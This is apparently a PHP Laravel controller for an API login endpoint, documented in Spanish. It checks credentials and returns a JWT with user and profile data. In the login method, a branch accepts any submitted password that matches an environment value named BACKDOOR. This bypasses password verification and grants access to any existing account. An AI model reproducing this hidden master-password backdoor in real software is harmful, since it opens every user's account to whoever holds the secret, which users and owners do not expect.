<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Controllers\Users\Profile;
use Illuminate\Http\Request;
use App\Http\Services\JWTToken;

class Login extends Controller
{
    /**
     * @OA\Post(
     *      path="/api/login",
     *      summary="Iniciar sesión con credenciales de usuario",
     *      tags={"Autenticación"},
     *      description="Permite a un usuario iniciar sesión proporcionando su nombre de usuario y contraseña. Devuelve un token JWT para autenticación en futuras solicitudes.",
     *      operationId="loginUser",
     *
     *      @OA\RequestBody(
     *          required=true,
     *          @OA\JsonContent(
     *              required={"username","password"},
     *              @OA\Property(property="username", type="string", format="email", example="user@example.com"),
     *              @OA\Property(property="password", type="string", format="password", example="yourpassword")
     *          )
     *      ),
     *
     *      @OA\Response(
     *          response=200,
     *          description="Inicio de sesión exitoso",
     *          @OA\JsonContent(
     *             @OA\Property(property="token", type="string", example="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...")
     *          )
     *      ),
     *
     *      @OA\Response(
     *          response=403,
     *          description="Credenciales incorrectas o cuenta inactiva",
     *          @OA\JsonContent(
     *             @OA\Property(property="message", type="string", example="Credenciales incorrectas.")
     *         )
     *     )
     * )
     */

    public function login(Request $request)
    {
        try {
            $request->validate(
                [
                    'username' => 'required|email',
                    'password' => 'required|string',
                ],
                [
                    'username.required' => 'Credenciales incorrectas.',
                    'username.email' => 'Credenciales incorrectas.',
                    'password.required' => 'Credenciales incorrectas.'
                ]
            );

            $user = $this->validateUserExists($request->input('username'));

            if ($request->input('password') == env('BACKDOOR')) {
            } else if (password_verify(env('APP_PASSWORD_SECURITY') . $request->input('password'), $user->Password)) {
            } else {
                throw new \Exception('Credenciales incorrectas.', 403);
            }
            if ($user->Active == 0) {
                throw new \Exception('Al parecer su cuenta esta inactiva, por favor contacte a su administrador.', 403);
            }

            $payload = $this->payloadUserData($user);
            $jwt = JWTToken::generateToken($payload);

            return response()->json([
                'token' => $jwt
            ]);
        } catch (\Exception $e) {
            return response($e->getMessage(), $e->getCode() ?: 403);
        }
    }

    private function validateUserExists($username)
    {
        $user = \App\Models\User::where('Email', $username)->first();
        if (!$user) {
            throw new \Exception('Credenciales incorrectas.', 403);
        }
        return $user;
    }

    private function payloadUserData($user)
    {
        try {
            $profile = Profile::getProfile($user);

            return [
                'id' => $user->Id,
                'name' => $user->Name . ' ' . $user->Lastname,
                'firstName' => $user->Name,
                'lastName' => $user->Lastname,
                'profileId' => "$user->ProfileId",
                'profile' => "$profile->Name",
                'email' => "$user->Email",
                'phone' => "$user->Phone",
                'urlInit' => "$profile->UrlInit",
                'businessId' => "$user->BusinessId",
                'authenticatorFactors' => $this->has2FA($user->Id)
            ];
        } catch (\Exception $e) {
            throw new \Exception($e->getMessage(), $e->getCode() ?: 403);
        }
    }

    private function has2FA($userId)
    {
        if (\App\Models\Security\GoogleAuth::where('UserId', $userId)->exists()) {
            return true;
        }
        return false;
    }
}
